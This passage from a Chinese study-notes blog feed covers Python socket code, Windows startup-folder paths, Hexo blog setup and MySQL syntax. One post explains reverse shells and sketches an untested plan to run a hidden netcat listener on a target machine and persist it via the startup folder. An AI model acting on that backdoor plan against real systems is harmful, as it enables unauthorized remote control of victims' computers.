port</span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        self.sock.bind((self.host, self.port))</span><br><span class="line">        <span class="comment"># 超时收取，超过5秒没收到客户端回应自动断开连接</span></span><br><span class="line">        <span class="comment"># self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVTIMEO, pack(&#x27;QQ&#x27;, 5, 0))</span></span><br><span class="line">        <span class="comment"># 超时发送，超过5秒没将数据传送至客户端断开连接</span></span><br><span class="line">        <span class="comment"># self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDTIMEO, pack(&#x27;QQ&#x27;, 4, 0))</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">listen</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.sock.listen(<span class="number">5</span>)</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        在这里插入对Ctrl+C的控制</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="comment"># 循环连接，可以与多个客户端依次链接</span></span><br><span class="line">        <span class="comment"># while True:</span></span><br><span class="line">        client, address = self.sock.accept()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;正在接收客户端信息...\n&#x27;</span>)</span><br><span class="line">        <span class="comment"># 超过30秒停止活动</span></span><br><span class="line">        <span class="comment"># client.settimeout(15)</span></span><br><span class="line">        t1 = threading.Thread(target=self.handleClientRequest, args=(</span><br><span class="line">            client, address))</span><br><span class="line">        t1.start()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handleClientRequest</span>(<span class="params">self, client, address</span>):</span></span><br><span class="line">        <span class="comment"># 采取循环，使每次与客户端连接都可以进行多次对话</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data = client.recv(<span class="number">1024</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;显示客户端信息：&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">                <span class="keyword">if</span> data:</span><br><span class="line">                    client.send(data)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Client has disconnected&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                client.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    server = ThreadSocket(<span class="string">&#x27;&#x27;</span>, <span class="number">9000</span>)</span><br><span class="line">    server.listen()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">target_host = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">target_ip = <span class="number">9000</span></span><br><span class="line"></span><br><span class="line">client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">client.connect((target_host, target_ip))</span><br><span class="line">send_data = <span class="built_in">input</span>(<span class="string">&#x27;输入你想说的：&#x27;</span>)</span><br><span class="line">client.send(send_data.encode())</span><br><span class="line">response = client.recv(<span class="number">4096</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.decode() + <span class="string">&#x27;love&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="三、socket常见选项之SO-REUSEADDR-SO-REUSEPORT"><a href="#三、socket常见选项之SO-REUSEADDR-SO-REUSEPORT" class="headerlink" title="三、socket常见选项之SO_REUSEADDR,SO_REUSEPORT"></a>三、<a href="https://www.cnblogs.com/HKUI/p/11707170.html">socket常见选项之SO_REUSEADDR,SO_REUSEPORT</a></h3><ul><li>使端口被释放后可以立即被使用</li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 网络编程 </tag>
            
            <tag> 套接字 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win10开机自启文件夹</title>
      <link href="/2020/09/14/win_10%20%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E6%96%87%E4%BB%B6%E5%A4%B9/"/>
      <url>/2020/09/14/win_10%20%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E6%96%87%E4%BB%B6%E5%A4%B9/</url>
      
        <content type="html"><![CDATA[<h2 id="所有用户的开机自启文件夹"><a href="#所有用户的开机自启文件夹" class="headerlink" title="所有用户的开机自启文件夹"></a>所有用户的开机自启文件夹</h2><ul><li>英文路径</li></ul><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># ProgramData目录是隐藏的</span><br><span class="line">C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</span><br></pre></td></tr></table></figure><ul><li>中文路径</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\ProgramData\Microsoft\Windows\「开始」菜单\程序\启动</span><br></pre></td></tr></table></figure><h2 id="指定用户的开机自启文件夹"><a href="#指定用户的开机自启文件夹" class="headerlink" title="指定用户的开机自启文件夹"></a>指定用户的开机自启文件夹</h2><ul><li>英文路径</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure><ul><li>中文路径</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\用户\username\AppData\Roaming\Microsoft\Windows\「开始」菜单\程序\启动</span><br></pre></td></tr></table></figure><ul><li>打开隐藏文件夹的方法</li></ul><p><a href="https://imgchr.com/i/BFDqhV"><img "" class="lazyload placeholder" data-original="https://s1.ax1x.com/2020/10/22/BFDqhV.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="BFDqhV.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> win10 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> win10 </tag>
            
            <tag> 文件夹 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>win10安装vim</title>
      <link href="/2020/09/14/windows10%E5%AE%89%E8%A3%85vim/"/>
      <url>/2020/09/14/windows10%E5%AE%89%E8%A3%85vim/</url>
      
        <content type="html"><![CDATA[<h1 id="windows10安装vim"><a href="#windows10安装vim" class="headerlink" title="windows10安装vim"></a>windows10安装vim</h1><p>[点击链接](<a href="https://github.com/vim/vim-win32-installer/releases">Releases · vim/vim-win32-installer · GitHub</a>)</p><ul><li>注意：一些杀毒软件可能会阻止安装该软件，允许即可</li><li>进入win10命令行，输入vim即可进入界面</li><li>默认安装在C:\Program Files\Vim</li></ul>]]></content>
      
      
      <categories>
          
          <category> win10 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> win10 </tag>
            
            <tag> vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网与外网</title>
      <link href="/2020/09/14/%E5%86%85%E7%BD%91%E4%B8%8E%E5%A4%96%E7%BD%91%E7%AE%80%E4%BB%8B/"/>
      <url>/2020/09/14/%E5%86%85%E7%BD%91%E4%B8%8E%E5%A4%96%E7%BD%91%E7%AE%80%E4%BB%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="内网与外网"><a href="#内网与外网" class="headerlink" title="内网与外网"></a>内网与外网</h1><p><a href="https://zhuanlan.zhihu.com/p/147282153">原文链接</a></p><h2 id="一、名词概念"><a href="#一、名词概念" class="headerlink" title="一、名词概念"></a>一、名词概念</h2><h3 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h3><span id="more"></span><ul><li>即局域网是指在某一区域内由多台计算机互联成的计算机组。一般是方圆几千米以内。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等功能。局域网是封闭型的，可以由办公室内的两台计算机组成，也可以由一个公司内的上千台计算机组成。</li></ul><h3 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h3><ul><li>即广域网，又称公网。是连接不同地区局域网或城域网计算机通信的远程网。通常跨接很大的物理范围，所覆盖的范围从几十公里到几千公里，它能连接多个地区、城市和国家，或横跨几个洲并能提供远距离通信，形成国际性的远程网络。广域网并不等同于互联网。</li></ul><h2 id="二、区别"><a href="#二、区别" class="headerlink" title="二、区别"></a>二、区别</h2><ol><li>ip地址设置的区别，一般内网有自己的IP号段，也不会和互联网号段冲突，内网就是从路由器以下开始的，而且IP都是以192开头的IP。一般是不能拥有外网IP的，因为个人或者小群体用外网也是一种资源浪费，所以一般都是通过内网去上网的，外网Ip一般都是用于公司企业，学校等机构的。</li><li>内网电脑连接外网需要一个统一出口，可能被限制一些不必要的访问，而外网就不经路由器或交换机就可以上网的网络，可以直接被外界所访问到，无需经如何设备，直接连接电脑。</li><li>内网相对外网会多一层安全防火墙（外网路由），相对来说抵御来自外网的攻击能力会好一些；内网不足之处在于，可能会遭到来自内部的攻击；因为要共享带宽，相对网速可能会慢些（终端越多越慢）。</li><li>内网的ip可以经常换，可以自己定义规则；而外网的ip一般都是固定的，你装好宽带的时候，你的ip就固定下来了。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建博客</title>
      <link href="/2020/09/14/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
      <url>/2020/09/14/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="搭建静态页面个人博客"><a href="#搭建静态页面个人博客" class="headerlink" title="搭建静态页面个人博客"></a>搭建静态页面个人博客</h1><p><a href="https://www.jianshu.com/p/189fd945f38f">参考文献</a></p><p><a href="">参考文献</a></p><h3 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h3><ol><li><p>检查电脑是否有node.js</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br></pre></td></tr></table></figure><span id="more"></span></li><li><p>若没有则下载</p></li><li><p>安装npm</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br><span class="line">这样会报错</span><br></pre></td></tr></table></figure></li></ol><h3 id="解决错误："><a href="#解决错误：" class="headerlink" title="解决错误："></a>解决错误：</h3><p>Missing write access to /usr/local/lib/node_modules是没有写权限, npm官方给出的解决方案是新建一个有权限的文件夹, 在这个新文件夹中安装npm包. 这个方法不适用于Microsoft Windows系统.<br>在用户的根目录创建文件夹(名字不一定要是.npm-global, 可以自己起):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/.npm-global</span><br></pre></td></tr></table></figure><p>设置npm全局包的安装路径:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set prefix &#x27;~/.npm-global&#x27;</span><br></pre></td></tr></table></figure><p>在用户的根目录下查看有没有.profile文件, 如果没有就创建, 然后用文本编辑器打开, 加上以下一行, 保存:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=~/.npm-global/bin:$PATH</span><br></pre></td></tr></table></figure><p>回到终端运行以下命令, 让配置生效:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure><p>然后全局安装npm包就可以了.</p><p>[原文链<a href="https://blog.csdn.net/zhangxuekang/article/details/89075039">接</a></p><ol start="2"><li><p>将 Hexo 所在的目录下的 node_modules 添加到环境变量之中即可直接使用 hexo <command>：</p><p>echo ‘PATH=”$PATH:./node_modules/.bin”‘ &gt;&gt; ~/.profile</p></li><li><p>初始化博客框架</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 选择一个地方新建博客目录</span><br><span class="line">npx hexo init blog</span><br><span class="line"></span><br><span class="line"># 生成博客文件夹中的moudle文件夹</span><br><span class="line">npx hexo g</span><br><span class="line"></span><br><span class="line"># 进行本机器运行测试</span><br><span class="line">npx hexo server</span><br></pre></td></tr></table></figure><h3 id="主题切换"><a href="#主题切换" class="headerlink" title="主题切换"></a>主题切换</h3><ol><li><p>去hexo官网下载主题，克隆到自己的仓库下</p></li><li><p>配置自己的站点文件（根目录下的_config.yml,不是主题下的），切换至自己的主题</p><p>并且更改语言设置成zh-CN</p></li><li><p>在source文件夹下新建标签文件夹(tags)和分类文件夹(categories)以及about文件夹[内容为个人简介或声明],如果还需要其他的自己可以建，笔记文档放在_posts文件夹内</p></li></ol><h3 id="博客与github挂钩"><a href="#博客与github挂钩" class="headerlink" title="博客与github挂钩"></a>博客与github挂钩</h3><ol><li><p>在github上新建一个仓库，仓库名为    自己的github名.github.io</p></li><li><p>在自己的博客目录下的站点配置文件_config.yml中进行配置，在文件的末尾找到并进行修改：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">type: git</span><br><span class="line">repo: 仓库名称.git  (.git不能少)</span><br><span class="line">branch： master</span><br></pre></td></tr></table></figure></li><li><p>安装git部署插件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure></li><li><p>之后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npx hexo clean</span><br><span class="line">npx hexo g</span><br><span class="line"># 进行网站部署</span><br><span class="line">npx hexo d</span><br></pre></td></tr></table></figure></li><li><p>大功告成</p></li></ol><h2 id="绑定域名"><a href="#绑定域名" class="headerlink" title="绑定域名"></a>绑定域名</h2><ol><li><p>先去购买域名</p></li><li><p>进行域名注册</p></li><li><p>再进行域名解析（必要的环节）</p><ul><li>进入解析页面</li><li>添加解析</li><li>在命令行下ping自己的github和博客绑定的仓库</li><li>得到ip地址之后添加到解析列表</li></ul></li><li><p>进入博客的source目录下，新建名为 CNAME 的文件，在里面写入自己申请的域名</p></li><li><p>进入blog，依次输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npx hexo clean</span><br><span class="line">npx hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure></li><li><p>大功告成.</p></li></ol><h3 id="hexo发生error-spawn-failed错误的解决方法"><a href="#hexo发生error-spawn-failed错误的解决方法" class="headerlink" title="hexo发生error:spawn failed错误的解决方法"></a>hexo发生error:spawn failed错误的解决方法</h3><ul><li><a href="https://blog.csdn.net/HTL2018/article/details/106876940">原文链接</a></li><li>问题原因：由于git进行push或者hexo d 的时候改变了一些 .deploy_git 文件下的内容</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 出现错误</span><br><span class="line">error:spawn failed...</span><br><span class="line">#解决方法</span><br><span class="line">1. 删除blog文件夹中的 .deploy_git 文件夹</span><br><span class="line">2. 输入 git config --global core.autocrlf false</span><br><span class="line">3. </span><br><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反弹shell</title>
      <link href="/2020/09/14/%E5%8F%8D%E5%BC%B9shell%E5%8E%9F%E7%90%86/"/>
      <url>/2020/09/14/%E5%8F%8D%E5%BC%B9shell%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="反弹shell原理"><a href="#反弹shell原理" class="headerlink" title="反弹shell原理"></a>反弹shell原理</h1><p><a href="https://www.cnblogs.com/iouwenbo/p/11277453.html">相关原文链接</a></p><h2 id="反弹shell定义"><a href="#反弹shell定义" class="headerlink" title="反弹shell定义"></a>反弹shell定义</h2><span id="more"></span><ul><li>正向连接目的机器我将之称为正向shell，即远程控制，如远程桌面，ssh</li><li>所以可以理解反弹shell，即从目的机器连接我们的控制系统，从而我们可以控制目的机器</li><li>本质上反弹shell是建立一个服务器，使目的机器主称为客户端，主动连接服务器并将自己的shell给我们的控制系统</li></ul><h2 id="反弹应用情景"><a href="#反弹应用情景" class="headerlink" title="反弹应用情景"></a>反弹应用情景</h2><ol><li>某客户机中了你的网马，但是它在局域网内，你直接连接不了。</li><li>目标机器的ip动态改变，你不能持续控制。</li><li>由于防火墙等限制，对方机器只能发送请求，不能接收请求</li><li>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。</li></ol><h2 id="利用netcat进行反弹shell思路"><a href="#利用netcat进行反弹shell思路" class="headerlink" title="利用netcat进行反弹shell思路"></a>利用netcat进行反弹shell思路</h2><ul><li>注：只是想法，本人还未进行实践，未知可行性</li></ul><ol><li>在目标主机上建立服务器，如果有netcat直接使用，使用指令 -d 隐藏cmd命令行窗口，保持后台运行，使用指令 -L 使服务器一直保持开启状态，不受客户端断开而关闭，如果没有netcat可以使用Python编写一个服务器（前提是目标机器上有python程序）</li><li>将建立好的服务器放置于目标机器的开机自启文件夹中</li><li>在自己的机器上建立客户端，这样随时就可以访问了</li></ol>]]></content>
      
      
      <categories>
          
          <category> shell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> necat </tag>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MYSQL(二)</title>
      <link href="/2020/09/14/%E6%95%B0%E6%8D%AE%E5%BA%93(%E4%BA%8C)/"/>
      <url>/2020/09/14/%E6%95%B0%E6%8D%AE%E5%BA%93(%E4%BA%8C)/</url>
      
        <content type="html"><![CDATA[<h1 id="数据库（二）"><a href="#数据库（二）" class="headerlink" title="数据库（二）"></a>数据库（二）</h1><p><a href="https://www.bilibili.com/video/BV12b411K7Zu/?p=105">参考的相关视频资料连接</a></p><h2 id="DML语言"><a href="#DML语言" class="headerlink" title="DML语言"></a>DML语言</h2><ul><li>数据操作语言：<ul><li>插入：insert</li><li>修改：update</li><li>删除：delete</li></ul></li></ul><h3 id="插入语句"><a href="#插入语句" class="headerlink" title="插入语句"></a>插入语句</h3><h4 id="方式一：经典插入语句"><a href="#方式一：经典插入语句" class="headerlink" title="方式一：经典插入语句"></a>方式一：经典插入语句</h4><span id="more"></span><ul><li>语法</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">insert into 表名（列名1, 列名2, ...）</span><br><span class="line">values （值1, 值2, ...）;</span><br></pre></td></tr></table></figure><ul><li>注意事项：<ol><li>插入的值的类型与列的类型一致或兼容</li><li>可以为NULL的列可以插入NULL值，不为NULL的列必须插入值</li><li>列的顺序可以调换，但是插入的值必须和列相匹配</li><li>列数和值得个数必须相一致</li><li>可以省略列名，默认所有列，而且列的顺序和表中的顺序一致</li></ol></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">insert into beauty</span><br><span class="line">values(列1, 列2, ...);            //省略列名，默认所有列</span><br></pre></td></tr></table></figure><h4 id="方式二："><a href="#方式二：" class="headerlink" title="方式二："></a>方式二：</h4><ol><li>语法：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">insert into 表名</span><br><span class="line">set 列名1=值1，列名2=值2，...</span><br></pre></td></tr></table></figure><ol start="2"><li>案例:</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">insert into beauty</span><br><span class="line">set id=19, name=&#x27;章子怡&#x27;，phone=&#x27;110&#x27;;</span><br></pre></td></tr></table></figure><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ol><li>方式一支持插入多行，方式二不行</li><li>方式一支持子查询，方式二不行</li></ol><h3 id="修改语句"><a href="#修改语句" class="headerlink" title="修改语句"></a>修改语句</h3><h4 id="修改单表的记录（-重点）"><a href="#修改单表的记录（-重点）" class="headerlink" title="修改单表的记录（*重点）"></a>修改单表的记录（*重点）</h4><ol><li>语法：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">update 表名</span><br><span class="line">set 列=新值，列=新值，...</span><br><span class="line">where 筛选条件；</span><br></pre></td></tr></table></figure><ol start="2"><li>案例：修改boys表中id号位2的名称为张飞，魅力值10</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">update boys set boyname=&#x27;张飞&#x27;， usercp=10</span><br><span class="line">where id=2;</span><br></pre></td></tr></table></figure><h4 id="修改多表得记录-了解即可"><a href="#修改多表得记录-了解即可" class="headerlink" title="修改多表得记录(了解即可)"></a>修改多表得记录(了解即可)</h4><ol><li>语法：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sql92语法：</span><br><span class="line">update 表1 别名， 表2 别名</span><br><span class="line">set 列=值，...</span><br><span class="line">where 连接条件</span><br><span class="line">and 筛选条件</span><br><span class="line"></span><br><span class="line">sql99语法：</span><br><span class="line">update 表1 别名</span><br><span class="line">inner 连接类型 join 表2 别名</span><br><span class="line">on 链接条件</span><br><span class="line">set 列=值，...</span><br></pre></td></tr></table></figure><h3 id="删除语句"><a href="#删除语句" class="headerlink" title="删除语句"></a>删除语句</h3><ol><li>方式一：delete </li></ol><ul><li>删除整行</li><li>单表的删除</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语法：</span><br><span class="line">delete from 表名 where 筛选条件</span><br></pre></td></tr></table></figure><ul><li>案例：删除手机号以3结尾的女孩信息</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">delete from girls </span><br><span class="line">where phon like &#x27;%3&#x27;;</span><br></pre></td></tr></table></figure><ol start="2"><li>方式二：truncate</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语法：</span><br><span class="line">truncate table 表名</span><br></pre></td></tr></table></figure><ul><li>案例：将魅力值&gt;100的男神信息删除</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">truncate table boys;</span><br></pre></td></tr></table></figure><h2 id="DDL语言"><a href="#DDL语言" class="headerlink" title="DDL语言"></a>DDL语言</h2><ol><li>DDL数据定义语言</li><li>表和库的管理</li></ol><h3 id="库的操作"><a href="#库的操作" class="headerlink" title="库的操作"></a>库的操作</h3><ol><li>库的创建</li></ol><ul><li>语法：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create database (if not exists)库名；</span><br></pre></td></tr></table></figure><ol start="2"><li>库的删除</li></ol><ul><li>语法：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop database if exists 库名；</span><br></pre></td></tr></table></figure><h3 id="表的管理"><a href="#表的管理" class="headerlink" title="表的管理"></a>表的管理</h3><ol><li>表的创建</li></ol><ul><li>语法：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create  table 表名(</span><br><span class="line">列名 列的类型【(长度) (约束)】，  //长度和约束可选</span><br><span class="line">列名 列的类型【(长度) (约束)】，</span><br><span class="line">...</span><br><span class="line">)；</span><br></pre></td></tr></table></figure><ul><li>案例：创建表Book</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">creat table book(</span><br><span class="line">id int, #编号</span><br><span class="line">bname varchar (20),  #图书名</span><br><span class="line">authorid int,  #作者编号</span><br><span class="line">publishdate datetime;  #出版日期</span><br><span class="line">)；</span><br></pre></td></tr></table></figure><ol start="2"><li>表的修改</li></ol><ul><li>语法：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 关键字 column 列名 列类型 约束</span><br></pre></td></tr></table></figure><ul><li>修改列名</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//参考上个案例，创建表book</span><br><span class="line">alter table book change aolumn publish pubdate datetime;</span><br></pre></td></tr></table></figure><ul><li>修改列的类型或约束</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table book modify column pubtade timestamp;</span><br></pre></td></tr></table></figure><ul><li>添加新列</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table author add column annual double;</span><br></pre></td></tr></table></figure><ul><li>删除列</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table author drop column annual;</span><br></pre></td></tr></table></figure><ul><li>修改表名</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table  author rename to book_author;</span><br></pre></td></tr></table></figure><ol start="3"><li>表的删除</li></ol><ul><li>语法：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop table if exists book_author;</span><br></pre></td></tr></table></figure><ul><li>通用的写法：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">drop database if exists 旧库名；</span><br><span class="line">create database 新库名；</span><br><span class="line"></span><br><span class="line">drop table if exists 旧表名；</span><br><span class="line">create table 表名（）；</span><br></pre></td></tr></table></figure><ol start="4"><li>表的复制</li></ol><ul><li>复制表的结构</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table copy like author;</span><br></pre></td></tr></table></figure><ul><li>复制表的结构+数据</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create table copy2</span><br><span class="line">select * from author;</span><br></pre></td></tr></table></figure><ul><li>只复制部分数据</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create table copy3</span><br><span class="line">select id, au_name</span><br><span class="line">from 